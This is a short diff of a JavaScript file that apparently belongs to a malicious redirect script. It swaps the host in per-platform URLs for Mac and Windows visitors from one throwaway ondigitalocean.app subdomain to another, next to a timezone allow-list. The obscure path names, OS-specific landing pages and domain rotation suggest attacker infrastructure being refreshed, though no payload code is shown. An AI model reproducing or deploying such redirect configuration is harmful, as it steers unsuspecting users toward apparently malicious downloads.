@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://sea-lion-app-58uyi.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://sea-lion-app-58uyi.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://monkfish-app-e7o4y.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://monkfish-app-e7o4y.ondigitalocean.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
